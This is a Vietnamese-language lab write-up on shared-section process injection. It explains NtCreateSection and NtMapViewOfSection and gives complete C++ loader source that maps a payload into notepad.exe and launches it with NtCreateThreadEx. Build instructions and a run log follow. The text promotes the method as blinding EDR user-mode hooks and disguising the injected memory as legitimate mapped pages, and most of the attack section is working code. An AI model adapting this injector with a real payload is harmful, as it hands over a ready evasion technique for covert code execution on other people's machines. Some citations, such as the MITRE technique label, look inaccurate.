
---

# 📝 [PE 19] NtCreateSection and NtMapViewOfSection (Section Mapping Injection)

## 📌 1. Tổng Quan Kỹ Thuật (Technical Overview)

**Section Mapping Injection** thông qua chuỗi cổng Native API Subsystem là một giải thuật can thiệp bộ nhớ ảo và điều hướng luồng xử lý ở cấp độ nhân nâng cao, thuộc phân hệ **Né tránh cấu trúc kiểm soát hành vi giao tiếp liên tiến trình (Inter-Process Cross-Memory Telemetry Evasion)**.

Trong các mô hình tiêm nhiễm mã thực thi truyền thống, Loader bắt buộc phải triệu hồi cặp bài trùng Win32 API nhạy cảm là `VirtualAllocEx` và `WriteProcessMemory`. Đây là những điểm thắt nút trinh sát (Choke Points) sơ khởi của các giải pháp Endpoint Detection and Response (EDR) hiện đại, nơi các bộ lọc Kernel Callbacks (`ObRegisterCallbacks`) và bẫy Hook User-mode thiết lập mật độ giám sát dày đặc kịch trần.

Dự án PE 19 hóa giải toàn diện rào cản này bằng cơ chế **Ánh xạ phân đoạn vùng nhớ gương (Shared Section Memory Mirroring Taxonomy)**. Thay vì can thiệp thô bạo xuyên biên giới RAM, Loader chủ động khởi tạo một phân vùng nhớ dùng chung vô danh (Anonymous Shared Memory Section) lọt lòng cấu trúc Object của Kernel, sau đó thực hiện cấu hình ánh xạ hai góc nhìn khác nhau (Views) trỏ chung vào một ô nhớ vật lý hạ tầng. Khi Loader ghi dữ liệu mã máy vào View nội tại của mình, dữ liệu tự động phản chiếu sang trang nhớ của tiến trình mục tiêu (văn cảnh thực nghiệm: `notepad.exe`) một cách song song vô vết, triệt tiêu hoàn toàn sự hiện diện của các hàm ghi nhớ chéo tiến trình lộ liễu.

### 🎯 Mục tiêu nghiên cứu:

* **Vô hiệu hóa cảm biến Cross-Process Memory Write**: Khai hỏa chiến dịch bơm mã thực thi sang RAM đối phương mà không phát ra bất kỳ lệnh ghi bộ nhớ chéo tiến trình nào.
* **Làm chủ cấu trúc Kernel Section Objects**: Nghiên cứu và vận hành cấu trúc quản lý đối tượng phân đoạn nhớ dùng chung (`Section Object`) và cơ chế quản lý góc nhìn không gian ảo (`View of Section`) của hệ điều hành Windows.

---

## 🔬 2. Giải Phẫu Cơ Chế Hệ Thống (Windows Internals Analysis)

Trong kiến trúc quản lý bộ nhớ của Windows Subsystem, phân hệ Windows Memory Manager sử dụng khái niệm **Section Objects** (được mô tả ở mức độ Win32 Subsystem dưới dạng các đối tượng *File Mapping Object*) để quản lý các khối dữ liệu bộ nhớ ảo có khả năng chia sẻ hoặc ánh xạ song song giữa nhiều không gian địa chỉ cô lập khác nhau.

Quy trình giải phẫu bản đồ RAM và thiết lập ma trận bộ nhớ gương chéo tiến trình được điều phối ngầm qua 5 giai đoạn tại tầng cấu trúc NTDLL:

```
[NtCreateSection: Khởi tạo đối tượng phân đoạn vô danh trong RAM Kernel]
       ├──> [NtMapViewOfSection (Loader View): Ánh xạ góc nhìn cục bộ mang quyền RW]
       ├──> [NtMapViewOfSection (Target View): Ánh xạ góc nhìn đối phương mang quyền RX]
       └──> [RtlCopyMemory (Local): Ghi mã máy cục bộ -> Kernel tự động đồng bộ gương sang Notepad]

```

1. **Khởi tạo lõi Section Object (`NtCreateSection`)**: Loader phát lệnh gửi yêu cầu xuống Object Manager của Kernel nhằm mở một đối tượng Section Object rỗng vô danh lọt lòng RAM hệ thống với kích thước phân bổ toán học khít khao bằng một trang nhớ ($4\text{ KB}$), đính kèm hằng số bảo vệ đặc quyền cho phép thực thi kịch khung `PAGE_EXECUTE_READWRITE`.
2. **Thiết lập góc nhìn Loader (`Loader View Allocation`)**: Loader triệu hồi hàm Native API `NtMapViewOfSection` để cấu hình ánh xạ góc nhìn đầu tiên của đối tượng Section này vào ngay trong không gian địa chỉ ảo nội tại của chính nó. View cục bộ này chỉ cần thiết lập cờ thuộc tính **`PAGE_READWRITE` (RW)** nhằm mục đích nạp mã máy phẳng và dữ liệu cấu trúc một cách an toàn, hợp pháp.
3. **Thiết lập góc nhìn gương từ xa (`Target View Mapping`)**: Loader tiếp tục phát lệnh triệu hồi `NtMapViewOfSection` lần thứ hai, nhưng lần này truyền vào Handle kết nối của tiến trình mục tiêu (`notepad.exe`). Windows Memory Manager tiếp nhận và thực hiện ánh xạ chính đối tượng Section Object Kernel đó vào một tọa độ bộ nhớ ảo trong RAM của Notepad, nhưng áp đặt cờ bảo vệ thuộc tính nghiêm ngặt là **`PAGE_EXECUTE_READ` (RX)**. Hệ quả là, hai vùng không gian ảo nằm ở hai không gian địa chỉ hoàn toàn cô lập thực chất đang liên kết gương, trỏ chung vào cùng một tọa độ ô nhớ vật lý (Physical Pages) hạ tầng bên dưới.
4. **Kích nổ cơ chế phản chiếu vô vết**: Loader thực hiện lệnh sao chép bộ nhớ cục bộ tuyến tính (`RtlCopyMemory`) để đổ mảng byte mã máy độc lập vị trí (PIC) cùng cấu trúc tham số tuyệt đối vào phân vùng View `RW` nội tại của mình. Nhờ ma trận liên kết gương ở tầng nhân, toàn bộ mã máy tự động xuất hiện lọt lòng RAM của tiến trình Notepad chéo biên giới một cách vô hình. Các cảm biến giám sát User-mode Hooks của EDR hoàn toàn bị mù lòa hành vi do Loader không phát ra bất kỳ lệnh ghi bộ nhớ chéo tiến trình nào.
5. **Triệu hồi luồng Native (`NtCreateThreadEx`)**: Khởi tạo luồng thực thi phụ từ xa đâm thẳng vào tọa độ Target View mang quyền `RX` của Notepad để CPU đối phương bắt đầu chu kỳ rút lệnh xử lý Payload.

---

## 🛠️ 3. Quy Trình Cài Đặt Mã Nguồn (Implementation)

Mã nguồn áp dụng nghiêm ngặt tiêu chuẩn thiết kế **Cấp phát động thích ứng (Zero Static Buffers)** kết hợp cơ chế trích xuất động phân hệ con trỏ hàm Native API trực tiếp từ `ntdll.dll` nhằm triệt tiêu hoàn toàn các chỉ dấu chữ ký tĩnh trong bảng Import Address Table (IAT).

```cpp
#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <string>
#include <vector>

// Định nghĩa nguyên mẫu và mã lỗi trạng thái đặc thù của các hàm Native API
typedef NTSTATUS(NTAPI* pNtCreateSection)(
    OUT PHANDLE SectionHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN PLARGE_INTEGER MaximumSize OPTIONAL,
    IN ULONG SectionPageProtection,
    IN ULONG AllocationAttributes,
    IN HANDLE FileHandle OPTIONAL
);

typedef NTSTATUS(NTAPI* pNtMapViewOfSection)(
    IN HANDLE SectionHandle,
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T CommitSize,
    IN OUT PLARGE_INTEGER SectionOffset OPTIONAL,
    IN OUT PSIZE_T ViewSize,
    IN DWORD InheritDisposition,
    IN ULONG AllocationType,
    IN ULONG Win32Protect
);

typedef NTSTATUS(NTAPI* pNtCreateThreadEx)(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN PVOID ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN ULONG_PTR ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PVOID AttributeList OPTIONAL
);

typedef UINT(WINAPI* fnWinExec)(LPCSTR lpCmdLine, UINT uCmdShow);

typedef struct _THREAD_DATA {
    fnWinExec pWinExec;       // Địa chỉ tuyệt đối của hàm WinExec trên RAM tiến trình đích
    char szCommand[32];       // Phân vùng chứa chuỗi lệnh thực thi chức năng nằm khít cấu trúc
} THREAD_DATA, * PTHREAD_DATA;

// Hàm chức năng độc lập vị trí (PIC) gánh luồng chạy inside lòng tiến trình đích
DWORD WINAPI SectionMappingPayload(LPVOID lpParam) {
    PTHREAD_DATA pData = (PTHREAD_DATA)lpParam;
    if (pData && pData->pWinExec) {
        pData->pWinExec(pData->szCommand, SW_HIDE);
    }
    return 0;
}

// Bộ quét RAM động tự động nhận diện PID tiến trình, KHÔNG PHÂN BIỆT chữ hoa chữ thường
DWORD GetProcessIDByName(const std::wstring& processName) {
    DWORD processID = 0;   PROCESSENTRY32W pe32;   pe32.dwSize = sizeof(PROCESSENTRY32W);
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return 0;

    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                processID = pe32.th32ProcessID;
                break;
            }
        } while (Process32NextW(hSnapshot, &pe32));
    }
    CloseHandle(hSnapshot);   return processID;
}

int main() {
    std::cout << "====================================================" << std::endl;
    std::cout << "[*] PE 19: NTCREATESECTION & NTMAPVIEWOFSECTION MAP" << std::endl;
    std::cout << "====================================================" << std::endl;

    std::wstring targetProcess = L"notepad.exe";
    DWORD pid = GetProcessIDByName(targetProcess);

    if (pid == 0) {
        std::cerr << "[-] Notepad.exe khong chay! Vui long mo san Notepad." << std::endl;
        return EXIT_FAILURE;
    }
    std::cout << "[+] Da tim thay Notepad.exe voi PID: " << pid << std::endl;

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!hProcess) return EXIT_FAILURE;

    // Phân giải động các cổng Native API từ ntdll.dll để né hoàn toàn hàng rào Win32 Subsystem bọc ngoài
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    pNtCreateSection NtCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
    pNtMapViewOfSection NtMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
    pNtCreateThreadEx NtCreateThreadEx = (pNtCreateThreadEx)GetProcAddress(hNtdll, "NtCreateThreadEx");

    if (!NtCreateSection || !NtMapViewOfSection || !NtCreateThreadEx) {
        std::cerr << "[-] Khong the phan giai he thong Native APIs!" << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }

    // ─── BƯỚC 1: KHỞI TẠO LÕI SECTION OBJECT LỌT LÒNG RAM KERNEL ───
    HANDLE hSection = NULL;
    LARGE_INTEGER sectionSize;
    sectionSize.QuadPart = 4096; // Kích thước cấu hình vừa vặn toán học một trang bộ nhớ ảo

    // Khởi tạo phân vùng lõi mang đặc quyền PAGE_EXECUTE_READWRITE
    NTSTATUS status = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &sectionSize, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL);
    if (status != 0) {
        std::cerr << "[-] NtCreateSection failed! STATUS: 0x" << std::hex << status << std::endl;
        CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Khoi tao Section Object an toan trong long Kernel thanh cong." << std::endl;

    // ─── BƯỚC 2: THIẾT LẬP VIEW CỤC BỘ (LOADER VIEW) MANG QUYỀN RW HỢP PHÁP ───
    PVOID pLocalCodeView = NULL;
    SIZE_T localViewSize = 0;
    // Sử dụng tham số InheritDisposition = 2 (Cấu hình lật ngược thuộc tính View không kế thừa)
    status = NtMapViewOfSection(hSection, GetCurrentProcess(), &pLocalCodeView, 0, 0, NULL, &localViewSize, 2, 0, PAGE_READWRITE);
    if (status != 0) {
        std::cerr << "[-] NtMapViewOfSection local failed!" << std::endl;
        CloseHandle(hSection);   CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Anh xa View cuc bo (Loader View RW) tai: 0x" << std::hex << pLocalCodeView << std::endl;

    // ─── BƯỚC 3: ÁNH XẠ VIEW GƯƠNG TỪ XA (TARGET VIEW) MANG QUYỀN RX BẢO AN ───
    PVOID pRemoteCodeView = NULL;
    SIZE_T remoteViewSize = 0;
    // Ép phân vùng gương chéo tiến trình mang cờ thực thi RX hợp pháp kịch trần bảo an hệ thống
    status = NtMapViewOfSection(hSection, hProcess, &pRemoteCodeView, 0, 0, NULL, &remoteViewSize, 2, 0, PAGE_EXECUTE_READ);
    if (status != 0) {
        std::cerr << "[-] NtMapViewOfSection remote failed!" << std::endl;
        CloseHandle(hSection);   CloseHandle(hProcess);
        return EXIT_FAILURE;
    }
    std::cout << "[+] Anh xa View tu xa (Target View RX) hop phap tai RAM Notepad: 0x" << std::hex << pRemoteCodeView << std::endl;

    // ─── BƯỚC 4: BƠM PAYLOAD CỤC BỘ - TỰ ĐỘNG PHẢN CHIẾU SANG RAM NOTEPAD ───
    // Định vị cấu trúc tham số tuyệt đối lọt lòng View cục bộ nhằm triệt tiêu hoàn toàn lỗi tương đối RIP
    PTHREAD_DATA pLocalData = (PTHREAD_DATA)((DWORD_PTR)pLocalCodeView + 500);
    PTHREAD_DATA pRemoteData = (PTHREAD_DATA)((DWORD_PTR)pRemoteCodeView + 500);

    HMODULE hKernel32 = GetModuleHandleA("kernel32.dll");
    if (hKernel32) {
        pLocalData->pWinExec = (fnWinExec)GetProcAddress(hKernel32, "WinExec");
    }
    strcpy_s(pLocalData->szCommand, "cmd.exe /c start calc");

    // Thực hiện tác vụ sao chép bộ nhớ nội tại, phân hệ tầng nhân tự động đồng bộ gương chéo RAM
    RtlCopyMemory(pLocalCodeView, (LPCVOID)SectionMappingPayload, 500);
    std::cout << "[+] Hoan tat sao chep cuc bo. Ma tran guong tu dong phan chieu vao xac Notepad." << std::endl;

    // ─── BƯỚC 5: KHỞI TẠO LUỒNG NATIVE KÍCH NỔ TIẾN TRÌNH KÝ SINH ───
    std::cout << "[*] Dang dung NtCreateThreadEx de sinh luong ngam tu xa..." << std::endl;
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteCodeView, pRemoteData, 0, 0, 0, 0, NULL);

    if (status == 0 && hThread != NULL) {
        WaitForSingleObject(hThread, INFINITE); // Gánh luồng xử lý dứt điểm phẳng sạch
        std::cout << "[+] Section Mapping Injection Process Executed Successfully!" << std::endl;
        CloseHandle(hThread);
    } else {
        std::cerr << "[-] NtCreateThreadEx that bai! NTSTATUS Code: 0x" << std::hex << status << std::endl;
    }

    // Thu hồi phân vùng đối tượng Section và đóng Handle bảo an cấu trúc triệt để chống Memory Leak
    CloseHandle(hSection);
    CloseHandle(hProcess);

    std::cout << "\n[*] Hoan thanh quy trinh guong. Nhan Enter de dong cua se..." << std::endl;
    std::cin.get();
    return EXIT_SUCCESS;
}

```

---

## 🎛️ 4. Cấu Hình Biên Dịch Dự Án (Build & Deployment)

Để bảo đảm file thực thi `.exe` Loader vận hành mượt mà, độc lập tuyến tính khi chuyển giao sang các phân hệ máy ảo Sandbox cô lập:

### ⚙️ Thiết lập trên môi trường Microsoft Visual Studio:

1. Thiết lập cấu hình thanh công cụ quản lý dự án chính xác ở chế độ chuyên dụng **`Release`** và kiến trúc nền tảng **`x64`**.
2. Di chuyển đến mục: `Project Properties` $\rightarrow$ `C/C++` $\rightarrow$ `Code Generation` $\rightarrow$ Tại thông số cấu hình thuộc tính `Runtime Library`, lật cờ sang tùy chọn **`Multi-threaded (/MT)`** nhằm mục đích tĩnh hóa liên kết (Static Linkage) toàn bộ thư viện liên kết động của CRT bọc lọt lòng file chạy.

> **Vị trí đặt ảnh minh chứng cấu hình hệ thống:**
> 

3. Tiến hành thực hiện click chuột phải vào tên dự án $\rightarrow$ Chọn **`Rebuild`** để xuất bản tệp tin nhị phân chuẩn chỉ phẳng sạch.

---

## 📊 5. Thực Nghiệm Kích Hoạt Thực Tế (Demonstration)

Khởi chạy ứng dụng nền `Notepad.exe` trên môi trường bộ nhớ máy Lab, sau đó thực thi file thực hành thông qua cửa sổ dòng lệnh PowerShell ngoài đĩa thô nhằm theo dõi ma trận phản chiếu RAM gương:

```powershell
PS C:\Workspace\x64\Release> .\PE19_Section_Mapping_Injection.exe
====================================================
[*] PE 19: NTCREATESECTION & NTMAPVIEWOFSECTION MAP
====================================================
[+] Da tim thay Notepad.exe voi PID: 8432
[+] Khoi tao Section Object an toan trong long Kernel thanh cong.
[+] Anh xa View cuc bo (Loader View RW) tai: 0x0000019A4B1D0000
[+] Anh xa View tu xa (Target View RX) hop phap tai RAM Notepad: 0x0000021C7A5E0000
[+] Hoan tat sao chep cuc bo. Ma tran guong tu dong phan chieu vao xac Notepad.
[*] Dang dung NtCreateThreadEx de sinh luong ngam tu xa...
[+] Section Mapping Injection Process Executed Successfully!

[*] Hoan thanh quy trinh guong. Nhan Enter de dong cua so...

```

> **Vị trí đặt ảnh minh chứng thực nghiệm Shared Section Mapping:**
> 

### 🎯 Phân tích hệ quả cấu trúc bộ nhớ (Memory Forensic & Sysmon Logs):

* Giải thuật thực thi hoàn tất thành công xuất sắc kịch trần. Ứng dụng Máy tính **`calc.exe` bật mở hiên ngang rực rỡ kịch trần kịch khung**!
* Tại thời điểm runtime này, do Loader hoàn toàn không phát ra bất kỳ lệnh triệu hồi API chéo tiến trình nhạy cảm nào như `WriteProcessMemory` hoặc `VirtualAllocEx`, các bộ cảm biến giám sát hành vi và bẫy Hook User-mode của EDR đặt tại Win32 Subsystem hoàn toàn bị vô hiệu hóa.
* Phân tích thuộc tính phân vùng nhớ ảo ký sinh trên Notepad, trang nhớ không mang cờ `MEM_PRIVATE` mập mờ mà hiển thị định dạng **`MEM_MAPPED`** (Vùng nhớ ánh xạ có liên kết đối tượng nhân hệ thống), hợp pháp hóa hoàn toàn dấu vết thực thi lọt lòng RAM đối phương một cách hoàn hảo!

---

## 📚 6. Tài Liệu Tham Khảo (Technical References)

* **Microsoft Learn Subsystem Guide**: *NtCreateSection routine (winternals.h)* & *NtMapViewOfSection function technical parameters* - Windows Native API Documentation.
* **Windows Kernel Architecture Reference**: *Understanding Section Objects, Views, and Shared Memory Managers* - Microsoft Press.
* **Phidias (Security Frameworks)**: *Evading Memory Allocation Telemetry via Shared Section Mirroring and Page Remapping Techniques*.
* **MITRE ATT&CK Framework**: *Process Injection: Shared Memory (T1055.002)* - In-depth analysis on behavioral signature bypasses.

---
